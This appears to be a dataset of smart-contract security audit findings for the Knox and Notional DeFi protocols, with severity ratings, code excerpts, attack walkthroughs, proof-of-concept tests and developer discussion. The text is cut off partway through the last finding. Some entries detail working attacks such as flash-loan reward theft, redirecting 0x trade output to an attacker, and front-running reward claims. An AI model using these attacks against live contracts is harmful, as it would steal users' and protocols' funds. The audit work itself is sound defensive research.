Underflow in ```_previewWithdraw``` could prevent withdrawalsчhighч"```\n it(""previewWithdraw reverts if buyer has too many contracts"", async () => {\n          assert.isEmpty(await auction.getEpochsByBuyer(addresses.buyer1));\n\n          await asset\n            .connect(signers.buyer1)\n            .approve(addresses.auction, ethers.constants.MaxUint256);\n\n          const totalContracts = await auction.getTotalContracts(epoch);\n          await auction.addLimitOrder(\n            epoch,\n            fixedFromFloat(params.price.max),\n            totalContracts.mul(2)\n          );\n\n          await auction.addLimitOrder(\n            epoch,\n            fixedFromFloat(params.price.max),\n            totalContracts.div(2)\n          );\n\n          const epochByBuyer = await auction.getEpochsByBuyer(addresses.buyer1);\n\n          assert.equal(epochByBuyer.length, 1);\n          assert.bnEqual(epochByBuyer[0], epoch);\n          \n          await expect(auction.callStatic[\n            ""previewWithdraw(uint64)""\n          ](epoch)).to.be.reverted;\n        });\n```\n"ч"The `_previewWithdraw` function returns the fill and refund amounts for a buyer by looping over all orders. A totalContractsSold variable is used to track the amount of contracts sold as the loop iterates over all orders. If the current order's size + totalContractsSold exceeds the auction's totalContracts then the order will only be filled partially. The calculation for the partial fill (remainder) is given on line 318. This will lead to an underflow if totalContractsSold > the auction's totalContracts which would happen if there are multiple orders that cause the totalContractsSold variable to exceed totalContracts.\nThe totalContractsSold variable in `_previewWithdraw` could exceed the auction.totalContracts due to the contracts sold before the start of an auction through limit orders not being limited. When an order is added, `_finalizeAuction` is only called if the auction has started. The `_finalizeAuction` function will call the `_processOrders` function which will return true if the auction has reached 100% utilization. Since limit orders can be made before the start of an auction, `_finalizeAuction` is not called and any amount of new orders may be made.\nExample: The buyer makes a limit order with size > auction.totalContracts. They then make another order with size of anything. These orders are made before the start of the auction so `_processOrders` is not called for every new order and totalContractsSold can exceed totalContracts. When `_previewWithdraw` is called, after the buyer's first order is processed, totalContractsSold > auction.totalContracts so the condition on line 313 passes. Since totalContractsSold > auction.totalContracts the calculation on line 318 underflows and the transaction reverts. The `_previewWithdraw` function and thus the `_withdraw` function is uncallable.\nTest code added to `Auction.behaviour.ts`, under the `#addLimitOrder(uint64,int128,uint256)` section:\n```\n it(""previewWithdraw reverts if buyer has too many contracts"", async () => {\n          assert.isEmpty(await auction.getEpochsByBuyer(addresses.buyer1));\n\n          await asset\n            .connect(signers.buyer1)\n            .approve(addresses.auction, ethers.constants.MaxUint256);\n\n          const totalContracts = await auction.getTotalContracts(epoch);\n          await auction.addLimitOrder(\n            epoch,\n            fixedFromFloat(params.price.max),\n            totalContracts.mul(2)\n          );\n\n          await auction.addLimitOrder(\n            epoch,\n            fixedFromFloat(params.price.max),\n            totalContracts.div(2)\n          );\n\n          const epochByBuyer = await auction.getEpochsByBuyer(addresses.buyer1);\n\n          assert.equal(epochByBuyer.length, 1);\n          assert.bnEqual(epochByBuyer[0], epoch);\n          \n          await expect(auction.callStatic[\n            ""previewWithdraw(uint64)""\n          ](epoch)).to.be.reverted;\n        });\n```\n\nThe test code above shows a buyer is able to add an order with size auction.totalContracts*2 and a subsequent order with size auction.totalContracts/2. The `previewWithdraw` function reverts when called."ч
processAuction() in VaultAdmin.sol can be called multiple times by keeper if the auction is canceled.чmediumч"```\n   bool cancelled = l.Auction.isCancelled(lastEpoch);\n        bool finalized = l.Auction.isFinalized(lastEpoch);\n\n        require(\n            (!finalized && cancelled) || (finalized && !cancelled),\n            ""auction is not finalized nor cancelled""\n        );\n```\n"ч"this code only runs when the auction is finalized, it not finalized, the auction is in Canceled State and\n```\n   bool cancelled = l.Auction.isCancelled(lastEpoch);\n        bool finalized = l.Auction.isFinalized(lastEpoch);\n\n        require(\n            (!finalized && cancelled) || (finalized && !cancelled),\n            ""auction is not finalized nor cancelled""\n        );\n```\n\nwould always pass because the auction is in cancel state."чSource: https://github.com/sherlock-audit/2022-09-knox-judging/issues/26\nFound by\nctf_sec\nWe recommend the project lock the epoch and make it impossible for keeper to call the processAuction again.\nDiscussion\n0xCourtney\nThe `Keeper` is an EOA owned/controlled by the protocol team and therefore considered trusted.\nEvert0x\n@0xCourtney as there are require statements based on the auction state, is it a valid use case that `processAuction()` get's called multiple times (by the keeper)? If not I can see the argument for the missing check.\n0xCourtney\nNo, this function should only be called once. We'll add a guard to prevent multiple calls.чWhy the processAuction should not be called multiple times?\nIn the first time it is called, the withdrawal lock is released so user can withdraw fund,\n```\n // deactivates withdrawal lock\n  l.auctionProcessed = true;\n```\n\nthen if we called again, the lastTotalAssets can be updated multiple times.\n```\n        // stores the last total asset amount, this is effectively the amount of assets held\n        // in the vault at the start of the auction\n        l.lastTotalAssets = _totalAssets();\n```\n\nthe total asset can be lower and lower because people are withdrawing their fund.\nthen when _collectPerformanceFee is called, the performance may still be collected\nCode Snippet\nTool used\nManual Review
`TradingUtils._executeTrade()` doesn't check `preTradeBalance` properly.чhighч```\nfunction _executeTrade(\n    address target,\n    uint256 msgValue,\n    bytes memory params,\n    address spender,\n    Trade memory trade\n) private {\n    uint256 preTradeBalance;\n\n    if (trade.sellToken == address(Deployments.WETH) && spender == Deployments.ETH_ADDRESS) {\n        preTradeBalance = address(this).balance;\n        // Curve doesn't support Deployments.WETH (spender == address(0))\n        uint256 withdrawAmount = _isExactIn(trade) ? trade.amount : trade.limit;\n        Deployments.WETH.withdraw(withdrawAmount);\n    } else if (trade.sellToken == Deployments.ETH_ADDRESS && spender != Deployments.ETH_ADDRESS) {\n        preTradeBalance = IERC20(address(Deployments.WETH)).balanceOf(address(this));\n        // UniswapV3 doesn't support ETH (spender != address(0))\n        uint256 depositAmount = _isExactIn(trade) ? trade.amount : trade.limit;\n        Deployments.WETH.deposit{value: depositAmount }();\n    }\n\n    (bool success, bytes memory returnData) = target.call{value: msgValue}(params);\n    if (!success) revert TradeExecution(returnData);\n\n    if (trade.buyToken == address(Deployments.WETH)) {\n        if (address(this).balance > preTradeBalance) {\n            // If the caller specifies that they want to receive Deployments.WETH but we have received ETH,\n            // wrap the ETH to Deployments.WETH.\n            uint256 depositAmount;\n            unchecked { depositAmount = address(this).balance - preTradeBalance; }\n            Deployments.WETH.deposit{value: depositAmount}();\n        }\n    } else if (trade.buyToken == Deployments.ETH_ADDRESS) {\n        uint256 postTradeBalance = IERC20(address(Deployments.WETH)).balanceOf(address(this));\n        if (postTradeBalance > preTradeBalance) {\n            // If the caller specifies that they want to receive ETH but we have received Deployments.WETH,\n            // unwrap the Deployments.WETH to ETH.\n            uint256 withdrawAmount;\n            unchecked { withdrawAmount = postTradeBalance - preTradeBalance; }\n            Deployments.WETH.withdraw(withdrawAmount);\n        }\n    }\n}\n```\nч`TradingUtils._executeTrade()` doesn't check `preTradeBalance` properly.\n`TradingUtils._executeTrade()` doesn't check `preTradeBalance` properly.\n```\nfunction _executeTrade(\n    address target,\n    uint256 msgValue,\n    bytes memory params,\n    address spender,\n    Trade memory trade\n) private {\n    uint256 preTradeBalance;\n\n    if (trade.sellToken == address(Deployments.WETH) && spender == Deployments.ETH_ADDRESS) {\n        preTradeBalance = address(this).balance;\n        // Curve doesn't support Deployments.WETH (spender == address(0))\n        uint256 withdrawAmount = _isExactIn(trade) ? trade.amount : trade.limit;\n        Deployments.WETH.withdraw(withdrawAmount);\n    } else if (trade.sellToken == Deployments.ETH_ADDRESS && spender != Deployments.ETH_ADDRESS) {\n        preTradeBalance = IERC20(address(Deployments.WETH)).balanceOf(address(this));\n        // UniswapV3 doesn't support ETH (spender != address(0))\n        uint256 depositAmount = _isExactIn(trade) ? trade.amount : trade.limit;\n        Deployments.WETH.deposit{value: depositAmount }();\n    }\n\n    (bool success, bytes memory returnData) = target.call{value: msgValue}(params);\n    if (!success) revert TradeExecution(returnData);\n\n    if (trade.buyToken == address(Deployments.WETH)) {\n        if (address(this).balance > preTradeBalance) {\n            // If the caller specifies that they want to receive Deployments.WETH but we have received ETH,\n            // wrap the ETH to Deployments.WETH.\n            uint256 depositAmount;\n            unchecked { depositAmount = address(this).balance - preTradeBalance; }\n            Deployments.WETH.deposit{value: depositAmount}();\n        }\n    } else if (trade.buyToken == Deployments.ETH_ADDRESS) {\n        uint256 postTradeBalance = IERC20(address(Deployments.WETH)).balanceOf(address(this));\n        if (postTradeBalance > preTradeBalance) {\n            // If the caller specifies that they want to receive ETH but we have received Deployments.WETH,\n            // unwrap the Deployments.WETH to ETH.\n            uint256 withdrawAmount;\n            unchecked { withdrawAmount = postTradeBalance - preTradeBalance; }\n            Deployments.WETH.withdraw(withdrawAmount);\n        }\n    }\n}\n```\n\nIt uses `preTradeBalance` to manage the WETH/ETH deposits and withdrawals.\nBut it doesn't save the correct `preTradeBalance` for some cases.\nLet's assume `trade.sellToken = some ERC20 token(not WETH/ETH), trade.buyToken = WETH`\nBefore executing the trade, `preTradeBalance` will be 0 as both `if` conditions are false.\nThen all ETH inside the contract will be converted to WETH and considered as a `amountBought` here and here.\nAfter all, all ETH of the contract will be lost.\nAll WETH of the contract will be lost also when `trade.sellToken = some ERC20 token(not WETH/ETH), trade.buyToken = ETH` here.ч
Bought/Purchased Token Can Be Sent To Attacker's Wallet Using 0x Adaptorчhighч```\n    /// @dev Sells `sellAmount` of `inputToken` to the liquidity provider\n    ///      at the given `provider` address.\n    /// @param inputToken The token being sold.\n    /// @param outputToken The token being bought.\n    /// @param provider The address of the on-chain liquidity provider\n    ///        to trade with.\n    /// @param recipient The recipient of the bought tokens. If equal to\n    ///        address(0), `msg.sender` is assumed to be the recipient.\n    /// @param sellAmount The amount of `inputToken` to sell.\n    /// @param minBuyAmount The minimum acceptable amount of `outputToken` to\n    ///        buy. Reverts if this amount is not satisfied.\n    /// @param auxiliaryData Auxiliary data supplied to the `provider` contract.\n    /// @return boughtAmount The amount of `outputToken` bought.\n    function sellToLiquidityProvider(\n        IERC20TokenV06 inputToken,\n        IERC20TokenV06 outputToken,\n        ILiquidityProvider provider,\n        address recipient,\n        uint256 sellAmount,\n        uint256 minBuyAmount,\n        bytes calldata auxiliaryData\n    )\n```\nч"The lack of recipient validation against the 0x order within the 0x adaptor (ZeroExAdapter) allows the purchased/output tokens of the trade to be sent to the attacker's wallet.\nBackground\nHow does the emergency vault settlement process work?\nAnyone can call the `settleVaultEmergency` function to trigger the emergency vault settlement as it is permissionless\nThe `_getEmergencySettlementParams` function will calculate the excess BPT tokens within the vault to be settled/sold\nThe amount of excess BPT tokens will be converted to an equivalence amount of strategy tokens to be settled\nThe strategy tokens will be settled by withdrawing staked BPT tokens from Aura Finance back to the vault for redemption.\nThe vault will then redeem the BTP tokens from Balancer to redeem its underlying assets (WETH and stETH)\nThe primary and secondary assets of the vault are WETH and stETH respectively. The secondary asset (stETH) will be traded for the primary asset (WETH) in one of the supported DEXes. In the end, only the primary assets (WETH) should remain within the vault.\nThe WETH within the vault will be sent to Notional, and Notional will mint the asset tokens (cEther) for the vault in return.\nAfter completing the emergency vault settlement process, the vault will gain asset tokens (cEther) after settling/selling its excess BPT tokens.\nIssue Description\nThe caller of the `settleVaultEmergency` function can specify the trade parameters to sell the secondary tokens (stETH) for primary tokens (WETH) in any of the supported 5 DEX protocols (Curve, Balancer V2, Uniswap V2 & V3 and 0x) in Step 5 of the above emergency vault settlement process.\nAfter analyzing the adaptors of 5 DEX protocols (Curve, Balancer V2, Uniswap V2 & V3 and 0x), it was observed that Curve, Balancer V2, Uniswap V2, and Uniswap V3 are designed in a way that the purchased tokens can only be returned to the vault.\nTake the Uniswap V2 adaptor as an example. When the vault triggers the trade execution, it will always pass its own address `address(this)` `to` the `from` parameter of the `getExecutionData` function. The value of `from` parameter will be passed `to` the `to` parameter of Uniswap's `swapExactTokensForTokens` function, which indicates the recipient of the output/purchased tokens. Therefore, it is impossible for the caller `to` specify the recipient of the output tokens `to` another address. This is also the same for Curve, Balancer V2, and Uniswap V3.\nNote: Specification of `swapExactTokensForTokens` function can be found at https://docs.uniswap.org/protocol/V2/reference/smart-contracts/router-02#swapexacttokensfortokens\nHowever, this is not implemented for the 0x adaptor (ZeroExAdapter). The `from` of the `getExecutionData` is completely ignored, and the caller has the full flexibility of crafting an order that benefits the caller.\nA number of features are supported by 0x. The full list of the supported features can be found here. Specifically, the following are the functions of attacker interest because it allows the attacker to configure the `recipient` parameter so that the bought tokens will be redirected to the attacker's wallet instead of the vault.\nLiquidityProviderFeature - sellToLiquidityProvider\n```\n    /// @dev Sells `sellAmount` of `inputToken` to the liquidity provider\n    ///      at the given `provider` address.\n    /// @param inputToken The token being sold.\n    /// @param outputToken The token being bought.\n    /// @param provider The address of the on-chain liquidity provider\n    ///        to trade with.\n    /// @param recipient The recipient of the bought tokens. If equal to\n    ///        address(0), `msg.sender` is assumed to be the recipient.\n    /// @param sellAmount The amount of `inputToken` to sell.\n    /// @param minBuyAmount The minimum acceptable amount of `outputToken` to\n    ///        buy. Reverts if this amount is not satisfied.\n    /// @param auxiliaryData Auxiliary data supplied to the `provider` contract.\n    /// @return boughtAmount The amount of `outputToken` bought.\n    function sellToLiquidityProvider(\n        IERC20TokenV06 inputToken,\n        IERC20TokenV06 outputToken,\n        ILiquidityProvider provider,\n        address recipient,\n        uint256 sellAmount,\n        uint256 minBuyAmount,\n        bytes calldata auxiliaryData\n    )\n```\n\nUniswapV3Feature - sellTokenForTokenToUniswapV3\n```\n    /// @dev Sell a token for another token directly against uniswap v3.\n    /// @param encodedPath Uniswap-encoded path.\n    /// @param sellAmount amount of the first token in the path to sell.\n    /// @param minBuyAmount Minimum amount of the last token in the path to buy.\n    /// @param recipient The recipient of the bought tokens. Can be zero for sender.\n    /// @return buyAmount Amount of the last token in the path bought.\n    function sellTokenForTokenToUniswapV3(\n        bytes memory encodedPath,\n        uint256 sellAmount,\n        uint256 minBuyAmount,\n        address recipient\n    )\n```\n\nThe malicious user could perform the following actions to steal the assets:\nAllow malicious users to specify the recipient of the output/purchased tokens to be themselves instead of the vault. This will cause the output/purchased tokens of the trade to be redirected to the malicious users instead of the vault\nSpecify the `minBuyAmount` parameter of the order to `1 WEI` so that he only needs to provide `1 WEI` to fill the order to obtain all the secondary token (stETH) that need to be sold. This is allowed as there is no slippage control within 0x adaptor (Refer to my ""No Slippage Control If The Trade Executes Via 0x DEX During Emergency Vault Settlement"" issue write-up)"ч"
Gain From Balancer Vaults Can Be Stolenчmediumч```\nbptClaim = (strategyTokenAmount * context.totalBPTHeld) / context.vaultState.totalStrategyTokenGlobal;\n1,000,999 = (1000000 * 1002000) / 1001000\n```\nчThe BPT gain (rewards) of the vault can be stolen by an attacker.\nAt T0 (Time 0), assume that the state of the WETH/wstETH MetaPool Vault is as follows:\ntotalBPTHeld = 1000 BPT\ntotalStrategyTokenGlobal = 1000\n1 Strategy Token can claim 1 BPT\nAlice holds 1000 Strategy Tokens, and she is the only person invested in the vault at this point in time\nAssume that if the `reinvestReward` is called, it will reinvest 1000 BPT back into the vault. Thus, if the `reinvestReward` is called, the `totalBPTHeld` of the vault will become 2000 BPT.\nFollowing is the description of the attack:\nThe attacker notice that if the `reinvestReward` is called, it will result in a large increase in the total BPT held by the vault\nThe attacker flash-loan a large amount of WETH (e.g. 1,000,000) from a lending protocol (e.g. dydx)\nEnter the vault by depositing 1,000,000 WETH by calling the `VaultAccountAction.enterVault` function. However, do not borrow any cash from Notional by setting the `fCash` parameter of the `VaultAccountAction.enterVault` function to `0`.\nThere is no need to borrow from Notional as the attacker could already flash-loan a large amount of WETH with a non-existence fee rate (e.g. 1 Wei in dydx). Most importantly, the vault fee will only be charged if the user borrows from Notional. The fee is assessed within the `VaultAccount._borrowIntoVault`, which will be skipped if users are not borrowing. By not borrowing from Notional, the attacker does not need to pay any fee when entering the vault and this will make the attacker more profitable.\nThe vault will deposit 1,000,000 WETH to the Balancer pool and receive a large amount of BPT in return. For simplicity's sake, assume that the vault receives 1,000,000 BPT in return.\nBased on the `StrategyUtils._convertBPTClaimToStrategyTokens` function, the attacker will receive 100,000 strategy tokens. The state of the vault will be as follows after the attacker deposits:\ntotalBPTHeld = 1,001,000 BPT\ntotalStrategyTokenGlobal = 1,001,000\n1 Strategy Token can claim 1 BPT\nAlice holds 1000 Strategy Tokens\nAttacker holds 1,000,000 Strategy Tokens\nThe attacker calls the `reinvestReward` function, and reward tokens will be reinvested. Assume that the vault receives 1000 BPT. The state of the vault will be as follows after the reinvest:\ntotalBPTHeld = 1,002,000 BPT\ntotalStrategyTokenGlobal = 1,001,000\n1 Strategy Token can claim ~1.0009 BPT\nAlice holds 1000 Strategy Tokens\nAttacker holds 1,000,000 Strategy Tokens\nThe attacker exits the vault with all his strategy tokens by calling the `VaultAccountAction.exitVault` function. This will cause the vault the redeem all the 100,000 Strategy Tokens owned by the attacker. Based on the `StrategyUtils._convertStrategyTokensToBPTClaim` function, the attacker will receive 1,000,999 BPT in return. Note that there is no fee for exiting the vault and there is no need for repaying the debt as the attacker did not borrow any assets from Notional at the beginning.\n```\nbptClaim = (strategyTokenAmount * context.totalBPTHeld) / context.vaultState.totalStrategyTokenGlobal;\n1,000,999 = (1000000 * 1002000) / 1001000\n```\n\nProceed to repay the flash-loan at the end of the transaction. All the above steps are executed within a single transaction. Within a single transaction/block, the attacker is able to increase his holding of 1,000,000 BPT to 1,000,999 BPT after calling the `reinvestReward` function, and effectively gain around 999 BPT.\nAlice who had been invested in the vault since the vault was first launched should be entitled to the majority of the rewards (Close to 1000 BPT). However, the attacker who came in right before the `reinvestReward` function was triggered managed to obtain almost all of her allocated shares of rewards (999 BPT) and left only 1 BPT for Alice.\nNote: A flash-loan is not required if the attacker has sufficient liquidity to carry out the attack or the vault does not have much liquidity.\nFollowing are the two functions for converting between BPT and Strategy Token for reference.\n```\n/// @notice Converts BPT to strategy tokens\nfunction _convertBPTClaimToStrategyTokens(StrategyContext memory context, uint256 bptClaim)\n    internal pure returns (uint256 strategyTokenAmount) {\n    if (context.totalBPTHeld == 0) {\n        // Strategy tokens are in 8 decimal precision, BPT is in 18. Scale the minted amount down.\n        return (bptClaim * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / \n            BalancerConstants.BALANCER_PRECISION;\n    }\n\n    // BPT held in maturity is calculated before the new BPT tokens are minted, so this calculation\n    // is the tokens minted that will give the account a corresponding share of the new bpt balance held.\n    // The precision here will be the same as strategy token supply.\n    strategyTokenAmount = (bptClaim * context.vaultState.totalStrategyTokenGlobal) / context.totalBPTHeld;\n}\n```\n\n```\n/// @notice Converts strategy tokens to BPT\nfunction _convertStrategyTokensToBPTClaim(StrategyContext memory context, uint256 strategyTokenAmount)\n    internal pure returns (uint256 bptClaim) {\n    require(strategyTokenAmount <= context.vaultState.totalStrategyTokenGlobal);\n    if (context.vaultState.totalStrategyTokenGlobal > 0) {\n        bptClaim = (strategyTokenAmount * context.totalBPTHeld) / context.vaultState.totalStrategyTokenGlobal;\n    }\n}\n```\nчFollowing are the list of root causes of the issue and some recommendation to mitigate them.\n`reinvestReward` function is permissionless and can be called by anyone. It is recommended to implement access control to ensure that this function can only be triggered by Notional. Do note that even if the attacker cannot trigger the `reinvestReward` function, it is still possible for the attacker to front-run and back-end the `reinvestReward` transaction to carry out the attack if they see this transaction in the public mempool. Thus, consider sending the `reinvestReward` transaction as a private transaction via Flashbot so that the attacker cannot sandwich the transaction.\nThere is no withdrawal fee. Also, there is no deposit fee as long as users did not borrow from Notional. Therefore, this attack is mostly profitable. It is recommended to impose a fee on the users of the vault even if the users did not borrow from Notional. All users should be charged a fee for the use of the vault. This will make the attack less likely to be profitable in most cases.\nUsers can enter and exit the vault within the same transaction/block. This allows the attacker to leverage the flash-loan facility to reduce the cost of the attack to almost nothing. It is recommended to prevent users from entering and exiting the vault within the same transaction/block. If the user entered the vault in this block, he/she could only exit at the next block.\nThere is no snapshotting to keep track of the deposit to ensure that BPT gain/rewards distributions are weighted according to deposit duration. Thus, a whale could deposit right before the `reinvestReward` function is triggered and exit the vault afterward and reap most of the gains. Consider implementing snapshotting within the vault.\nDiscussion\njeffywu\n@T-Woodward / @weitianjie2000 we should discuss how to remediate this issue. I think the auditor has a good point about enter / exits within the same block that we should take a look at.\nAt the same time, I believe this attack is more pronounced when the attacker can get much higher leverage than the entire vault value (as in this example), so in practice it might be difficult.\nNote to self: it looks like a more strict enforcement of the minAccountBorrowSize would be sufficient to reduce the profitability of these attacks by forcing the account to borrow, will have to investigate how to do that without hampering other UX.\nT-Woodward\nYeah I think this is a legitimate issue. We are implementing the following changes:\nWe're permissioning the reinvestReward function.\nWe're adding a five block minimum holding period (you can't exit the vault until five blocks after you last entered). This means you can't use flash loans and actually have to have the capital.\nWe're adding minimum leverage ratios which will force you to borrow on entry and lend on exit and pay the fees associated with doing so. Additionally, there are transaction costs associated with entering and exiting the vault apart from the lending/borrowing fee on Notional.\nTogether, these changes will make the attack uneconomical because of the fees involved, it will require substantial capital, and you wouldn't know when we are going to call reinvestReward so you would have to basically always have your capital in to make sure you caught the reward reinvestment which would defeat the purpose of the whole thing.чLoss of assets for the users as their BPT gain (rewards) can be stolen. This issue affects all balancer-related vaults that contain the permissionless `reinvestReward` function.\nCode Snippet\nTool used\nManual Review
Malicious Users Can Deny Notional Treasury From Receiving Feeчmediumч```\n/**\n * @dev Gives a staker their rewards, with the option of claiming extra rewards\n * @param _account     Account for which to claim\n * @param _claimExtras Get the child rewards too?\n */\nfunction getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n    uint256 reward = earned(_account);\n    if (reward > 0) {\n        rewards[_account] = 0;\n        rewardToken.safeTransfer(_account, reward);\n        IDeposit(operator).rewardClaimed(pid, _account, reward);\n        emit RewardPaid(_account, reward);\n    }\n\n    //also get rewards from linked rewards\n    if(_claimExtras){\n        for(uint i=0; i < extraRewards.length; i++){\n            IRewards(extraRewards[i]).getReward(_account);\n        }\n    }\n    return true;\n}\n\nmodifier updateReward(address account) {\n    rewardPerTokenStored = rewardPerToken();\n    lastUpdateTime = lastTimeRewardApplicable();\n    if (account != address(0)) {\n        rewards[account] = earned(account);\n        userRewardPerTokenPaid[account] = rewardPerTokenStored;\n    }\n    _;\n}\n\nfunction earned(address account) public view returns (uint256) {\n    return\n        balanceOf(account)\n            .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n            .div(1e18)\n            .add(rewards[account]);\n}\n```\nч"Malicious users can deny Notional Treasury from receiving fees when rewards are reinvested.\nThe `claimRewardTokens` function will harvest the reward tokens from the Aura Pool, and the reward tokens will be transferred to the Balancer Vault. At lines 77-78, a portion of the reward tokens would be sent to the `FEE_RECEIVER`. After clarifying with the sponsor, it was understood that the `FEE_RECEIVER` would be set to Notional Treasury so that it would receive some of the accrued reward tokens.\nWithin the `claimRewardTokens` function, it will call the `AURA_REWARD_POOL.getReward` to harvest the reward tokens. Within the `claimRewardTokens` function, it also uses the pre-balance and post-balance of the reward tokens to check the actual amount of reward tokens that are transferred into the vault.\nHowever, the issue is that anyone can claim reward tokens from Aura Pool on behalf of any address. Following is the implementation of the `getReward` function taken from Aura's BaseRewardPool4626 contract called by the vault for reference.\nhttps://etherscan.io/address/0xdcee1c640cc270121faf145f231fd8ff1d8d5cd4\n```\n/**\n * @dev Gives a staker their rewards, with the option of claiming extra rewards\n * @param _account     Account for which to claim\n * @param _claimExtras Get the child rewards too?\n */\nfunction getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n    uint256 reward = earned(_account);\n    if (reward > 0) {\n        rewards[_account] = 0;\n        rewardToken.safeTransfer(_account, reward);\n        IDeposit(operator).rewardClaimed(pid, _account, reward);\n        emit RewardPaid(_account, reward);\n    }\n\n    //also get rewards from linked rewards\n    if(_claimExtras){\n        for(uint i=0; i < extraRewards.length; i++){\n            IRewards(extraRewards[i]).getReward(_account);\n        }\n    }\n    return true;\n}\n\nmodifier updateReward(address account) {\n    rewardPerTokenStored = rewardPerToken();\n    lastUpdateTime = lastTimeRewardApplicable();\n    if (account != address(0)) {\n        rewards[account] = earned(account);\n        userRewardPerTokenPaid[account] = rewardPerTokenStored;\n    }\n    _;\n}\n\nfunction earned(address account) public view returns (uint256) {\n    return\n        balanceOf(account)\n            .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n            .div(1e18)\n            .add(rewards[account]);\n}\n```\n\nAssume that a malicious user front runs a call to claim rewards tokens. When a keeper calls the `AURA_REWARD_POOL.getReward` to harvest the reward tokens, it will return no reward tokens, and therefore the difference between the pre-balance and post-balance of the reward tokens will amount to zero. Therefore, no reward tokens will be sent to the `FEE_RECEIVER` (Notional Treasury) as a fee.\nProof-of-Concept\nThe `test_claim_rewards_success` test case shows that under normal circumstances, the Notional treasury will receive a portion of the accrued BAL and AURA as fees.\nThe `test_claim_rewards_success_frontrun` test case shows that if the `getReward` is front-run by an attacker, the Notional treasury will receive nothing.\nThe following is the test script and its result.\n```\nimport pytest\nfrom brownie import ZERO_ADDRESS, Wei, accounts, interface\nfrom tests.fixtures import *\nfrom tests.balancer.helpers import enterMaturity, get_metastable_amounts\nfrom scripts.common import get_univ3_single_data, get_univ3_batch_data, DEX_ID, TRADE_TYPE\n\nchain = Chain()\n\ndef test_claim_rewards_success(StratStableETHstETH):\n    (env, vault) = StratStableETHstETH\n    primaryBorrowAmount = 100e8\n    depositAmount = 50e18\n    enterMaturity(env, vault, 1, 0, depositAmount, primaryBorrowAmount, accounts[0])\n    chain.sleep(3600 * 24 * 365)\n    chain.mine()\n    feeReceiver = vault.getStrategyContext()[""baseStrategy""][""feeReceiver""]\n    feePercentage = vault.getStrategyContext()[""baseStrategy""][""vaultSettings""][""feePercentage""] / 1e2\n    assert env.tokens[""BAL""].balanceOf(vault.address) == 0\n    assert env.tokens[""AURA""].balanceOf(vault.address) == 0\n    assert env.tokens[""BAL""].balanceOf(feeReceiver) == 0\n    assert env.tokens[""AURA""].balanceOf(feeReceiver) == 0\n\n    vault.claimRewardTokens({""from"": accounts[1]})\n\n    # Test that the fee receiver received portion of the rewards as fee\n    assert env.tokens[""BAL""].balanceOf(feeReceiver) > 0\n    assert env.tokens[""AURA""].balanceOf(feeReceiver) > 0\n\ndef test_claim_rewards_success_frontrun(StratStableETHstETH):\n    (env, vault) = StratStableETHstETH\n    primaryBorrowAmount = 100e8\n    depositAmount = 50e18\n    enterMaturity(env, vault, 1, 0, depositAmount, primaryBorrowAmount, accounts[0])\n    chain.sleep(3600 * 24 * 365)\n    chain.mine()\n    feeReceiver = vault.getStrategyContext()[""baseStrategy""][""feeReceiver""]\n    feePercentage = vault.getStrategyContext()[""baseStrategy""][""vaultSettings""][""feePercentage""] / 1e2\n    assert env.tokens[""BAL""].balanceOf(vault.address) == 0\n    assert env.tokens[""AURA""].balanceOf(vault.address) == 0\n    assert env.tokens[""BAL""].balanceOf(feeReceiver) == 0\n    assert env.tokens[""AURA""].balanceOf(feeReceiver) == 0\n\n    auraPool = interface.IAuraRewardPool(vault.getStrategyContext()[""stakingContext""][""auraRewardPool""])\n    auraPool.getReward(vault.address, True, {""from"": accounts[5]}) # Attacker frontrun the getReward\n    vault.claimRewardTokens({""from"": accounts[1]})\n\n    # Test that the fee receiver received nothing due the frontrunning\n    assert env.tokens[""BAL""].balanceOf(feeReceiver) == 0\n    assert env.tokens[""AURA""].balanceOf(feeReceiver) == 0\n```\n\n```\n❯ brownie test tests/balancer/rewards/test_rewards_stable_eth_steth.py --network mainnet-fork\nBrownie v1.18.1 - Python development framework for Ethereum\n\n=============================================================================================== test session starts ===============================================================================================\nplatform linux -- Python 3.8.10, pytest-6.2.5, py-1.11.0, pluggy-1.0.0\nplugins: eth-brownie-1.18.1, hypothesis-6.27.3, forked-1.4.0, xdist-1.34.0, web3-5.27.0\ncollected 2 items                                                                                                                                                                                                 \nAttached to local RPC client listening at '127.0.0.1:8545'// rest of code\n\ntests/balancer/rewards/test_rewards_stable_eth_steth.py ..                                                                                                                                                  [100%]\n\n========================================================================================== 2 passed, 1 warning in 5.72s ===========================================================================================\n```\n"чIt is recommended not to use the pre-balance and post-balance of the reward tokens when claiming reward tokens. A more robust internal accounting scheme needs to be implemented to keep track of actual reward tokens received from the pool so that the appropriate amount of the accrued reward tokens can be sent to the Notional Treasury.\nReference\nA similar high-risk issue was found in the past audit report\nhttps://code4rena.com/reports/2022-01-notional/#h-01-treasury-cannot-claim-comp-tokens--comp-tokens-are-stuck\nDiscussion\njeffywu\n@weitianjie2000 having some internal accounting seems reasonable here.\nT-Woodward\nThink low severity is reasonable here\nEvert0x\n@T-Woodward why is this a low? Seems like a loss for Notional Treasury and NOTE token holders\nT-Woodward\nYeah I mean I just don't see it as such a big deal. No loss to user funds. If it started to happen we could just upgrade it out\njeffywu\nI think given that the CodeArena issue was graded a High, I think Medium is ok as a severity here. I couldn't find the severity guidelines as a reference. The net effect here would be a small loss for the Notional Treasury and NOTE token.чNotional Treasury will not receive a portion of the accrued reward tokens as fees. Loss of assets for Notional protocol and its governance token holders.\nCode Snippet\nTool used\nManual Review
Existing Slippage Control Can Be Bypassed During Vault Settlementчmediumч"```\nFile: BalancerEnvironment.py\n            ""postMaturitySettlementSlippageLimitPercent"": 10e6, # 10%\n            ""emergencySettlementSlippageLimitPercent"": 10e6, # 10%\n```\n"ч"The existing slippage control can be bypassed/disabled during vault settlement, thus allowing the trade to be executed without consideration of its slippage.\nNote 1: This issue affects MetaStable2 and Boosted3 balancer leverage vaults\nNote 2: This issue affects the following three (3) processes. However, the root cause and the remediation action are the same for all. Therefore, only the PoC for the ""Emergency vault settlement"" process will be documented in this report, and the other two processes will be omitted for brevity. Refer to ""Appendix I - Normal and Post Maturity Vault Settlement"" for more details.\nEmergency vault settlement\nNormal vault settlement\nPost-Maturity vault settlement.\nNote 3: The issue affects all the supported DEXs (Curve, Balancer V2, Uniswap V2, Uniswap V3 and 0x) within Notional\nThe `emergencySettlementSlippageLimitPercent` of the vault is set to 10% as per the environment file provided by 